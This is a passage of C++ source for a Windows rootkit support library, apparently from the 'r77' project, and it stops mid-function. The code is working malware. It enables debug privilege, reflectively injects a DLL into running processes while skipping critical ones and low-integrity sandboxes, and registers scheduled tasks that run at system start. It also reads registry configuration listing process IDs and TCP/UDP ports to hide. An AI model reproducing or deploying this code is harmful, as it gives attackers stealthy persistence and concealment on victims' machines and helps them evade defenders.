#include "r77api.h"

VOID InitializeApi(DWORD flags)
{
	if (flags & INITIALIZE_API_SRAND) srand((unsigned int)time(0));
	if (flags & INITIALIZE_API_DEBUG_PRIVILEGE) EnabledDebugPrivilege();
}

VOID RandomString(PWCHAR str, DWORD length)
{
	for (DWORD i = 0; i < length; i++)
	{
		str[i] = L"0123456789abcdef"[rand() * 16 / RAND_MAX];
	}

	str[length] = L'\0';
}
BOOL Is64BitOperatingSystem()
{
	BOOL wow64;
	return sizeof(LPVOID) == 8 || IsWow64Process(GetCurrentProcess(), &wow64) && wow64;
}
BOOL Is64BitProcess(DWORD processId, LPBOOL is64Bit)
{
	BOOL result = FALSE;

	if (Is64BitOperatingSystem())
	{
		HANDLE process = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, processId);
		if (process)
		{
			BOOL wow64;
			if (IsWow64Process(process, &wow64))
			{
				*is64Bit = wow64 ? FALSE : TRUE;
				result = TRUE;
			}

			CloseHandle(process);
		}
	}
	else
	{
		*is64Bit = FALSE;
		result = TRUE;
	}

	return result;
}
PVOID GetFunction(LPCSTR dll, LPCSTR function)
{
	HMODULE module = GetModuleHandleA(dll);
	return module ? (PVOID)GetProcAddress(module, function) : NULL;
}
BOOL GetProcessIntegrityLevel(HANDLE process, LPDWORD integrityLevel)
{
	BOOL result = FALSE;

	HANDLE token;
	if (OpenProcessToken(process, TOKEN_QUERY, &token))
	{
		DWORD tokenSize;
		if (!GetTokenInformation(token, TOKEN_INFORMATION_CLASS::TokenIntegrityLevel, NULL, 0, &tokenSize) && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
		{
			PTOKEN_MANDATORY_LABEL tokenMandatoryLabel = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, tokenSize);
			if (tokenMandatoryLabel)
			{
				if (GetTokenInformation(token, TOKEN_INFORMATION_CLASS::TokenIntegrityLevel, tokenMandatoryLabel, tokenSize, &tokenSize))
				{
					*integrityLevel = *GetSidSubAuthority(tokenMandatoryLabel->Label.Sid, *GetSidSubAuthorityCount(tokenMandatoryLabel->Label.Sid) - 1);
					result = TRUE;
				}

				LocalFree(tokenMandatoryLabel);
			}
		}

		CloseHandle(token);
	}

	return result;
}
BOOL GetProcessFileName(DWORD processId, BOOL fullPath, LPWSTR fileName, DWORD fileNameLength)
{
	BOOL result = FALSE;

	HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
	if (process)
	{
		WCHAR path[MAX_PATH + 1];
		if (GetModuleFileNameExW(process, NULL, path, MAX_PATH))
		{
			PWCHAR resultFileName = fullPath ? path : PathFindFileNameW(path);
			if ((DWORD)lstrlenW(resultFileName) <= fileNameLength)
			{
				lstrcpyW(fileName, resultFileName);
				result = TRUE;
			}
		}

		CloseHandle(process);
	}

	return result;
}
BOOL GetProcessUserName(HANDLE process, PWCHAR name, LPDWORD nameLength)
{
	BOOL result = FALSE;

	HANDLE token;
	if (OpenProcessToken(process, TOKEN_QUERY, &token))
	{
		DWORD tokenSize = 0;
		if (!GetTokenInformation(token, TOKEN_INFORMATION_CLASS::TokenUser, NULL, 0, &tokenSize) && GetLastError() == ERROR_INSUFFICIENT_BUFFER)
		{
			PTOKEN_USER tokenUser = (PTOKEN_USER)LocalAlloc(0, tokenSize);
			if (tokenUser)
			{
				if (GetTokenInformation(token, TOKEN_INFORMATION_CLASS::TokenUser, tokenUser, tokenSize, &tokenSize))
				{
					WCHAR domain[256];
					DWORD domainLength = 256;
					SID_NAME_USE sidType;
					result = LookupAccountSidW(NULL, tokenUser->User.Sid, name, nameLength, domain, &domainLength, &sidType);
				}

				LocalFree(tokenUser);
			}
		}

		CloseHandle(token);
	}

	return result;
}
BOOL EnabledDebugPrivilege()
{
	BOOL result = FALSE;

	HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, GetCurrentProcessId());
	if (process)
	{
		HANDLE token;
		if (OpenProcessToken(process, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token))
		{
			LUID luid;
			if (LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid))
			{
				TOKEN_PRIVILEGES tokenPrivileges;
				tokenPrivileges.PrivilegeCount = 1;
				tokenPrivileges.Privileges[0].Luid = luid;
				tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

				if (AdjustTokenPrivileges(token, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
				{
					result = GetLastError() != ERROR_NOT_ALL_ASSIGNED;
				}
			}
		}

		CloseHandle(process);
	}

	return result;
}
BOOL GetResource(DWORD resourceID, PCSTR type, LPBYTE *data, LPDWORD size)
{
	HRSRC resource = FindResourceA(NULL, MAKEINTRESOURCEA(resourceID), type);
	if (resource)
	{
		*size = SizeofResource(NULL, resource);
		if (*size)
		{
			HGLOBAL resourceData = LoadResource(NULL, resource);
			if (resourceData)
			{
				*data = (LPBYTE)LockResource(resourceData);
				return TRUE;
			}
		}
	}

	return FALSE;
}
BOOL ReadFileContent(LPCWSTR path, LPBYTE *data, LPDWORD size)
{
	BOOL result = FALSE;

	HANDLE file = CreateFileW(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file != INVALID_HANDLE_VALUE)
	{
		DWORD fileSize = GetFileSize(file, NULL);
		if (fileSize != INVALID_FILE_SIZE)
		{
			LPBYTE fileData = new BYTE[fileSize];

			DWORD bytesRead;
			if (ReadFile(file, fileData, fileSize, &bytesRead, NULL) && bytesRead == fileSize)
			{
				*data = fileData;
				if (size) *size = fileSize;
				result = TRUE;
			}
			else
			{
				delete[] fileData;
			}
		}

		CloseHandle(file);
	}

	return result;
}
BOOL WriteFileContent(LPCWSTR path, LPBYTE data, DWORD size)
{
	BOOL result = FALSE;

	HANDLE file = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file != INVALID_HANDLE_VALUE)
	{
		DWORD bytesWritten;
		result = WriteFile(file, data, size, &bytesWritten, NULL);
		CloseHandle(file);
	}

	return result;
}
BOOL CreateTempFile(LPBYTE file, DWORD fileSize, LPCWSTR extension, LPWSTR resultPath)
{
	BOOL result = FALSE;
	WCHAR tempPath[MAX_PATH + 1];

	if (GetTempPathW(MAX_PATH, tempPath))
	{
		WCHAR fileName[MAX_PATH + 1];
		RandomString(fileName, 8);
		lstrcatW(fileName, L".");
		lstrcatW(fileName, extension);

		if (PathCombineW(resultPath, tempPath, fileName) && WriteFileContent(resultPath, file, fileSize))
		{
			result = TRUE;
		}
	}

	return result;
}
BOOL ExecuteFile(LPCWSTR path, BOOL deleteFile)
{
	BOOL result = FALSE;

	STARTUPINFOW startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(startupInfo));
	ZeroMemory(&processInformation, sizeof(processInformation));
	startupInfo.cb = sizeof(startupInfo);

	if (CreateProcessW(path, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &startupInfo, &processInformation))
	{
		WaitForSingleObject(processInformation.hProcess, 10000);
		CloseHandle(processInformation.hProcess);
		CloseHandle(processInformation.hThread);

		result = TRUE;
	}

	if (deleteFile)
	{
		for (int i = 0; i < 10; i++)
		{
			if (DeleteFileW(path)) break;
			Sleep(100);
		}
	}

	return result;
}
BOOL CreateScheduledTask(LPCWSTR name, LPCWSTR directory, LPCWSTR fileName, LPCWSTR arguments)
{
	BOOL result = FALSE;

	if (SUCCEEDED(CoInitialize(NULL)))
	{
		ITaskScheduler *taskScheduler = NULL;
		if (SUCCEEDED(CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID*)&taskScheduler)))
		{
			ITask *task = NULL;
			if (SUCCEEDED(taskScheduler->NewWorkItem(name, CLSID_CTask, IID_ITask, (IUnknown**)&task)))
			{
				if (SUCCEEDED(task->SetWorkingDirectory(directory)) &&
					SUCCEEDED(task->SetApplicationName(fileName)) &&
					SUCCEEDED(task->SetParameters(arguments)) &&
					SUCCEEDED(task->SetAccountInformation(L"", NULL)))
				{
					WORD triggerId;
					ITaskTrigger *trigger = NULL;
					if (SUCCEEDED(task->CreateTrigger(&triggerId, &trigger)))
					{
						TASK_TRIGGER triggerDetails;
						ZeroMemory(&triggerDetails, sizeof(TASK_TRIGGER));
						triggerDetails.cbTriggerSize = sizeof(TASK_TRIGGER);
						triggerDetails.TriggerType = TASK_EVENT_TRIGGER_AT_SYSTEMSTART;
						triggerDetails.wBeginDay = 1;
						triggerDetails.wBeginMonth = 1;
						triggerDetails.wBeginYear = 2000;

						if (SUCCEEDED(trigger->SetTrigger(&triggerDetails)))
						{
							IPersistFile *persistFile = NULL;
							if (SUCCEEDED(task->QueryInterface(IID_IPersistFile, (void **)&persistFile)))
							{
								if (SUCCEEDED(persistFile->Save(NULL, TRUE)))
								{
									result = TRUE;
								}

								persistFile->Release();
							}
						}

						trigger->Release();
					}
				}

				task->Release();
			}

			taskScheduler->Release();
		}

		CoUninitialize();
	}

	return result;
}
BOOL RunScheduledTask(LPCWSTR name)
{
	BOOL result = FALSE;

	if (SUCCEEDED(CoInitialize(NULL)))
	{
		ITaskScheduler *taskScheduler = NULL;
		if (SUCCEEDED(CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID*)&taskScheduler)))
		{
			ITask *task = NULL;
			if (SUCCEEDED(taskScheduler->Activate(name, IID_ITask, (IUnknown**)&task)))
			{
				if (SUCCEEDED(task->Run()))
				{
					result = TRUE;
				}

				task->Release();
			}

			taskScheduler->Release();
		}

		CoUninitialize();
	}

	return result;
}
BOOL DeleteScheduledTask(LPCWSTR name)
{
	BOOL result = FALSE;

	if (SUCCEEDED(CoInitialize(NULL)))
	{
		ITaskScheduler *taskScheduler = NULL;
		if (SUCCEEDED(CoCreateInstance(CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskScheduler, (LPVOID*)&taskScheduler)))
		{
			if (SUCCEEDED(taskScheduler->Delete(name)))
			{
				result = TRUE;
			}

			taskScheduler->Release();
		}

		CoUninitialize();
	}

	return result;
}
BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
{
	BOOL result = FALSE;

	// Unlike with "regular" DLL injection, the bitness must be checked explicitly.
	BOOL is64Bit;
	if (Is64BitProcess(processId, &is64Bit) && (is64Bit == TRUE) == (sizeof(LPVOID) == 8))
	{
		HANDLE process = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, processId);
		if (process)
		{
			// Do not inject critical processes (smss, csrss, wininit, etc.).
			ULONG breakOnTermination;
			if (NT_SUCCESS(NtQueryInformationProcess(process, PROCESSINFOCLASS::ProcessBreakOnTermination, &breakOnTermination, sizeof(ULONG), NULL)) && !breakOnTermination)
			{
				// Sandboxes tend to crash when injecting shellcode. Only inject medium IL and above.
				DWORD integrityLevel;
				if (GetProcessIntegrityLevel(process, &integrityLevel) && integrityLevel >= SECURITY_MANDATORY_MEDIUM_RID)
				{
					// Get function pointer to the shellcode that loads the DLL reflectively.
					DWORD entryPoint = GetReflectiveDllMain(dll);
					if (entryPoint)
					{
						LPBYTE allocatedMemory = (LPBYTE)VirtualAllocEx(process, NULL, dllSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
						if (allocatedMemory)
						{
							if (WriteProcessMemory(process, allocatedMemory, dll, dllSize, NULL))
							{
								HANDLE thread = NULL;
								if (NT_SUCCESS(nt::NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPTHREAD_START_ROUTINE)(allocatedMemory + entryPoint), allocatedMemory, 0, 0, 0, 0, NULL)) && thread)
								{
									if (fast)
									{
										// Fast mode is for bulk operations, where the return value of this function is ignored.
										// The return value of DllMain is not checked. This function just returns TRUE, if NtCreateThreadEx succeeded.
										result = TRUE;
									}
									else if (WaitForSingleObject(thread, 100) == WAIT_OBJECT_0)
									{
										// Return TRUE, only if DllMain returned TRUE.
										// DllMain returns FALSE, for example, if r77 is already injected.
										DWORD exitCode;
										if (GetExitCodeThread(thread, &exitCode))
										{
											result = exitCode != 0;
										}
									}

									CloseHandle(thread);
								}
							}
						}
					}
				}
			}

			CloseHandle(process);
		}
	}

	return result;
}
DWORD GetReflectiveDllMain(LPBYTE dll)
{
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dll + ((PIMAGE_DOS_HEADER)dll)->e_lfanew);
	if (ntHeaders->OptionalHeader.Magic == 0x10b && sizeof(LPVOID) == 4 || ntHeaders->OptionalHeader.Magic == 0x20b && sizeof(LPVOID) == 8)
	{
		PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dll + RvaToOffset(dll, ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress));
		LPDWORD nameDirectory = (LPDWORD)(dll + RvaToOffset(dll, exportDirectory->AddressOfNames));
		LPWORD nameOrdinalDirectory = (LPWORD)(dll + RvaToOffset(dll, exportDirectory->AddressOfNameOrdinals));

		for (DWORD i = 0; i < exportDirectory->NumberOfNames; i++)
		{
			if (strstr((PCHAR)(dll + RvaToOffset(dll, *nameDirectory)), "ReflectiveDllMain"))
			{
				return RvaToOffset(dll, *(LPDWORD)(dll + RvaToOffset(dll, exportDirectory->AddressOfFunctions) + *nameOrdinalDirectory * sizeof(DWORD)));
			}

			nameDirectory++;
			nameOrdinalDirectory++;
		}
	}

	return 0;
}
DWORD RvaToOffset(LPBYTE dll, DWORD rva)
{
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(dll + ((PIMAGE_DOS_HEADER)dll)->e_lfanew);
	PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)((LPBYTE)&ntHeaders->OptionalHeader + ntHeaders->FileHeader.SizeOfOptionalHeader);

	if (rva < sections[0].PointerToRawData)
	{
		return rva;
	}
	else
	{
		for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
		{
			if (rva >= sections[i].VirtualAddress && rva < sections[i].VirtualAddress + sections[i].SizeOfRawData)
			{
				return rva - sections[i].VirtualAddress + sections[i].PointerToRawData;
			}
		}

		return 0;
	}
}

BOOL GetR77Processes(PR77_PROCESS r77Processes, LPDWORD count)
{
	BOOL result = TRUE;
	DWORD actualCount = 0;

	LPDWORD processes = new DWORD[10000];
	DWORD processCount = 0;
	HMODULE *modules = new HMODULE[10000];
	DWORD moduleCount = 0;
	BYTE moduleBytes[512];

	if (EnumProcesses(processes, 10000 * sizeof(DWORD), &processCount))
	{
		processCount /= sizeof(DWORD);

		for (DWORD i = 0; i < processCount; i++)
		{
			HANDLE process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processes[i]);
			if (process)
			{
				if (EnumProcessModules(process, modules, 10000 * sizeof(HMODULE), &moduleCount))
				{
					moduleCount /= sizeof(HMODULE);

					for (DWORD j = 0; j < moduleCount; j++)
					{
						if (ReadProcessMemory(process, (LPBYTE)modules[j], moduleBytes, 512, NULL))
						{
							WORD signature = *(LPWORD)&moduleBytes[sizeof(IMAGE_DOS_HEADER)];
							if (signature == R77_SIGNATURE || signature == R77_SERVICE_SIGNATURE || signature == R77_HELPER_SIGNATURE)
							{
								if (actualCount < *count)
								{
									r77Processes[actualCount].ProcessId = processes[i];
									r77Processes[actualCount].Signature = signature;
									r77Processes[actualCount++].DetachAddress = signature == R77_SIGNATURE ? *(DWORD64*)&moduleBytes[sizeof(IMAGE_DOS_HEADER) + 2] : 0;
								}
								else
								{
									result = FALSE;
								}

								break;
							}
						}
					}
				}

				CloseHandle(process);
			}
		}
	}

	delete[] processes;
	delete[] modules;

	*count = actualCount;
	return result;
}
BOOL DetachInjectedProcess(const R77_PROCESS &r77Process)
{
	BOOL result = FALSE;

	if (r77Process.Signature == R77_SIGNATURE)
	{
		HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, r77Process.ProcessId);
		if (process)
		{
			// R77_PROCESS.DetachAddress is a function pointer to Rootkit::Detach
			HANDLE thread = NULL;
			if (NT_SUCCESS(nt::NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPTHREAD_START_ROUTINE)r77Process.DetachAddress, NULL, 0, 0, 0, 0, NULL)) && thread)
			{
				result = TRUE;
				CloseHandle(thread);
			}

			CloseHandle(process);
		}
	}

	return result;
}
BOOL DetachInjectedProcess(DWORD processId)
{
	BOOL result = FALSE;
	PR77_PROCESS r77Processes = new R77_PROCESS[1000];
	DWORD r77ProcessCount = 1000;

	if (GetR77Processes(r77Processes, &r77ProcessCount))
	{
		for (DWORD i = 0; i < r77ProcessCount; i++)
		{
			if (r77Processes[i].Signature == R77_SIGNATURE && r77Processes[i].ProcessId == processId)
			{
				result = DetachInjectedProcess(r77Processes[i]);
				break;
			}
		}
	}

	delete[] r77Processes;
	return result;
}
VOID DetachAllInjectedProcesses()
{
	PR77_PROCESS r77Processes = new R77_PROCESS[1000];
	DWORD r77ProcessCount = 1000;

	if (GetR77Processes(r77Processes, &r77ProcessCount))
	{
		for (DWORD i = 0; i < r77ProcessCount; i++)
		{
			if (r77Processes[i].Signature == R77_SIGNATURE)
			{
				DetachInjectedProcess(r77Processes[i]);
			}
		}
	}

	delete[] r77Processes;
}
VOID TerminateR77Service(DWORD excludedProcessId)
{
	PR77_PROCESS r77Processes = new R77_PROCESS[1000];
	DWORD r77ProcessCount = 1000;
	if (GetR77Processes(r77Processes, &r77ProcessCount))
	{
		for (DWORD i = 0; i < r77ProcessCount; i++)
		{
			if (r77Processes[i].Signature == R77_SERVICE_SIGNATURE && r77Processes[i].ProcessId != excludedProcessId)
			{
				HANDLE process = OpenProcess(PROCESS_TERMINATE, FALSE, r77Processes[i].ProcessId);
				if (process)
				{
					TerminateProcess(process, 0);
					CloseHandle(process);
				}
			}
		}
	}

	delete[] r77Processes;
}

VOID ReadR77ConfigKey(PR77_CONFIG config, HKEY key)
{
	// Read process ID's from the "pid" subkey.
	HKEY pidKey;
	if (RegOpenKeyExW(key, L"pid", 0, KEY_READ, &pidKey) == ERROR_SUCCESS)
	{
		DWORD count;
		if (RegQueryInfoKeyW(pidKey, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{
			WCHAR valueName[100];

			for (DWORD i = 0; i < count; i++)
			{
				DWORD valueNameLength = 100;
				DWORD type;
				DWORD processId;
				DWORD processIdSize = sizeof(DWORD);
				if (RegEnumValueW(pidKey, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&processId, &processIdSize) == ERROR_SUCCESS && type == REG_DWORD && processId > 0)
				{
					BOOL isNew = TRUE;

					for (DWORD p = 0; p < config->HiddenProcessIdCount; p++)
					{
						if (config->HiddenProcessIds[p] == processId)
						{
							isNew = FALSE;
							break;
						}
					}

					if (isNew && config->HiddenProcessIdCount < R77_CONFIG_MAX_HIDDEN_PROCESS_IDS)
					{
						config->HiddenProcessIds[config->HiddenProcessIdCount++] = processId;
					}
				}
			}
		}

		RegCloseKey(pidKey);
	}

	// Read local TCP ports from the "tcp_local" subkey.
	HKEY tcpLocalKey;
	if (RegOpenKeyExW(key, L"tcp_local", 0, KEY_READ, &tcpLocalKey) == ERROR_SUCCESS)
	{
		DWORD count;
		if (RegQueryInfoKeyW(tcpLocalKey, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{
			WCHAR valueName[100];

			for (DWORD i = 0; i < count; i++)
			{
				DWORD valueNameLength = 100;
				DWORD type;
				DWORD port;
				DWORD portSize = sizeof(DWORD);
				if (RegEnumValueW(tcpLocalKey, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&port, &portSize) == ERROR_SUCCESS && type == REG_DWORD && port > 0 && port < USHRT_MAX)
				{
					BOOL isNew = TRUE;

					for (DWORD p = 0; p < config->HiddenTcpLocalPortCount; p++)
					{
						if (config->HiddenTcpLocalPorts[p] == port)
						{
							isNew = FALSE;
							break;
						}
					}

					if (isNew && config->HiddenTcpLocalPortCount < R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS)
					{
						config->HiddenTcpLocalPorts[config->HiddenTcpLocalPortCount++] = (USHORT)port;
					}
				}
			}
		}

		RegCloseKey(tcpLocalKey);
	}

	// Read remote TCP ports from the "tcp_remote" subkey.
	HKEY tcpRemoteKey;
	if (RegOpenKeyExW(key, L"tcp_remote", 0, KEY_READ, &tcpRemoteKey) == ERROR_SUCCESS)
	{
		DWORD count;
		if (RegQueryInfoKeyW(tcpRemoteKey, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{
			WCHAR valueName[100];

			for (DWORD i = 0; i < count; i++)
			{
				DWORD valueNameLength = 100;
				DWORD type;
				DWORD port;
				DWORD portSize = sizeof(DWORD);
				if (RegEnumValueW(tcpRemoteKey, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&port, &portSize) == ERROR_SUCCESS && type == REG_DWORD && port > 0 && port < USHRT_MAX)
				{
					BOOL isNew = TRUE;

					for (DWORD p = 0; p < config->HiddenTcpRemotePortCount; p++)
					{
						if (config->HiddenTcpRemotePorts[p] == port)
						{
							isNew = FALSE;
							break;
						}
					}

					if (isNew && config->HiddenTcpRemotePortCount < R77_CONFIG_MAX_HIDDEN_TCP_REMOTE_PORTS)
					{
						config->HiddenTcpRemotePorts[config->HiddenTcpRemotePortCount++] = (USHORT)port;
					}
				}
			}
		}

		RegCloseKey(tcpRemoteKey);
	}

	// Read UDP ports from the "udp" subkey.
	HKEY udpKey;
	if (RegOpenKeyExW(key, L"udp", 0, KEY_READ, &udpKey) == ERROR_SUCCESS)
	{
		DWORD count;
		if (RegQueryInfoKeyW(udpKey, NULL, NULL, NULL, NULL, NULL, NULL, &count, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{
			WCHAR valueName[100];

			for (DWORD i = 0; i < count; i++)
			{
				DWORD valueNameLength = 100;
				DWORD type;
				DWORD port;
				DWORD portSize = sizeof(DWORD);
				if (RegEnumValueW(udpKey, i, valueName, &valueNameLength, NULL, &type, (LPBYTE)&port, &portSize) == ERROR_SUCCESS && type == REG_DWORD && port > 0 && port < USHRT_MAX)
				{
					BOOL isNew = TRUE;

					for (DWORD p = 0; p < config->HiddenUdpPortCount; p++)
					{
						if (config->HiddenUdpPorts[p] == port)
						{
							isNew = FALSE;
							break;
						}
					}

					if (isNew && config->HiddenUdpPortCount < R77_CONFIG_MAX_HIDDEN_UDP_PORTS)
					{
						config->HiddenUdpPorts[config->HiddenUdpPortCount++] = (USHORT)port;
					}
				}
			}
		}

		RegCloseKey(udpKey);
	}
}
PR77_CONFIG LoadR77Config()
{
	PR77_CONFIG config = new R77_CONFIG();
	config->HiddenProcessIdCount = 0;
	config->HiddenTcpLocalPortCount = 0;
	config->HiddenTcpRemotePortCount = 0;
	config->HiddenUdpPortCount = 0;
	config->HiddenProcessIds = new DWORD[R77_CONFIG_MAX_HIDDEN_PROCESS_IDS];
	config->HiddenTcpLocalPorts = new USHORT[R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS];
	config->HiddenTcpRemotePorts = new USHORT[R77_CONFIG_MAX_HIDDEN_TCP_REMOTE_PORTS];
	config->HiddenUdpPorts = new USHORT[R77_CONFIG_MAX_HIDDEN_UDP_PORTS];
	ZeroMemory(config->HiddenProcessIds, sizeof(DWORD) * R77_CONFIG_MAX_HIDDEN_PROCESS_IDS);
	ZeroMemory(config->HiddenTcpLocalPorts, sizeof(USHORT) * R77_CONFIG_MAX_HIDDEN_TCP_LOCAL_PORTS);
	ZeroMemory(config->HiddenTcpRemotePorts, sizeof(USHORT) * R77_CONFIG_MAX_HIDDEN_TCP_REMOTE_PORTS);
	ZeroMemory(config->HiddenUdpPorts, sizeof(USHORT) * R77_CONFIG_MAX_HIDDEN_UDP_PORTS);

	// Load configuration from HKEY_LOCAL_MACHINE\SOFTWARE\$77config
	HKEY localConfigKey;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\" HIDE_PREFIX L"config", 0, KEY_READ | KEY_WOW64_64KEY, &localConfigKey) == ERROR_SUCCESS)
	{
		ReadR77ConfigKey(config, localConfigKey);
		RegCloseKey(localConfigKey);
	}

	// Load configuration from HKEY_CURRENT_USER\SOFTWARE\$77config
	HKEY usersKey;
	if (RegOpenKeyExW(HKEY_USERS, NULL, 0, KEY_READ, &usersKey) == ERROR_SUCCESS)
	{
		// Enumerate subkeys of HKEY_USERS to retrieve the HKEY_CURRENT_USER key of each user.
		DWORD usersCount;
		if (RegQueryInfoKeyW(usersKey, NULL, NULL, NULL, &usersCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{
			WCHAR configKeyName[1000];

			for (DWORD i = 0; i < usersCount; i++)
			{
				DWORD configKeyNameLength = 1000;
				if (RegEnumKeyExW(usersKey, i, configKeyName, &configKeyNameLength, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
				{
					lstrcatW(configKeyName, L"\\Software\\" HIDE_PREFIX L"config");

					HKEY configKey;
					if (RegOpenKeyExW(HKEY_USERS, configKeyName, 0, KEY_READ, &configKey) == ERROR_SUCCESS)
					{
						ReadR77ConfigKey(config, configKey);
						RegCloseKey(configKey);
					}
				}
			}
		}

		RegCloseKey(usersKey);
	}

	return config;
}
VOID DeleteR77Config(PR77_CONFIG config)
{
	delete[] config->HiddenProcessIds;
	delete[] config->HiddenTcpLocalPorts;
	delete[] config->HiddenTcpRemotePorts;
	delete[] config->HiddenUdpPorts;
	ZeroMemory(config, sizeof(R77_CONFIG));
}
BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB)
{
	if (configA == configB)
	{
		return TRUE;
	}
	else if (configA == NULL || configB == NULL)
	{
		return FALSE;
	}
	else
	{
		if (configA->HiddenProcessIdCount == configB->HiddenProcessIdCount)
		{
			for (DWORD i = 0; i < configA->HiddenProcessIdCount; i++)
			{
				if (configA->HiddenProcessIds[i] != configB->HiddenProcessIds[i]) return FALSE;
			}
		}
		else
		{
			return FALSE;
		}

		if (configA->HiddenTcpLocalPortCount == configB->HiddenTcpLocalPortCount)
		{
			for (DWORD i = 0; i < configA->HiddenTcpLocalPortCount; i++)
			{
				if (configA->HiddenTcpLocalPorts[i] != configB->HiddenTcpLocalPorts[i]) return FALSE;
			}
		}
		else
		{
			return FALSE;
		}

		if (configA->HiddenTcpRemotePortCount == configB->HiddenTcpRemotePortCount)
		{
			for (DWORD i = 0; i < configA->HiddenTcpRemotePortCount; i++)
			{
				if (configA->HiddenTcpRemotePorts[i] != configB->HiddenTcpRemotePorts[i]) return FALSE;
			}
		}
		else
		{
			return FALSE;
		}

		if (configA->HiddenUdpPortCount == configB->HiddenUdpPortCount)
		{
			for (DWORD i = 0; i < configA->HiddenUdpPortCount; i++)
			{
				if (configA->HiddenUdpPorts[i] != configB->HiddenUdpPorts[i]) return FALSE;
			}
		}
		else
		{
			return FALSE;
		}

		return TRUE;
	}
}
VOID UninstallR77Config()
{
	// Delete HKEY_LOCAL_MACHINE\$77config
	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\pid", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\tcp_local", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\tcp_remote", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config\\udp", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"Software\\" HIDE_PREFIX L"config", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);

	// Delete HKEY_CURRENT_USER\$77config
	HKEY usersKey;
	if (RegOpenKeyExW(HKEY_USERS, NULL, 0, KEY_READ, &usersKey) == ERROR_SUCCESS)
	{
		// Enumerate subkeys of HKEY_USERS to retrieve the HKEY_CURRENT_USER key of each user.
		DWORD usersCount;
		if (RegQueryInfoKeyW(usersKey, NULL, NULL, NULL, &usersCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
		{
			WCHAR configKeyName[1000];
			WCHAR subKeyName[1000];

			for (DWORD i = 0; i < usersCount; i++)
			{
				DWORD configKeyNameLength = 1000;
				if (RegEnumKeyExW(usersKey, i, configKeyName, &configKeyNameLength, NULL, NULL, NULL, NULL) == ERROR_SUCCESS)
				{
					lstrcatW(configKeyName, L"\\Software\\" HIDE_PREFIX L"config");

					lstrcpyW(subKeyName, configKeyName);
					lstrcatW(subKeyName, L"\\pid");
					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);

					lstrcpyW(subKeyName, configKeyName);
					lstrcatW(subKeyName, L"\\tcp_local");
					RegDeleteKeyExW(HKEY_USERS, subKeyName, KEY_ALL_ACCESS, 0);

					lstrcpyW(subKeyName, configKeyName);
					lstrcatW(subKeyName, L"\\tcp_remote");
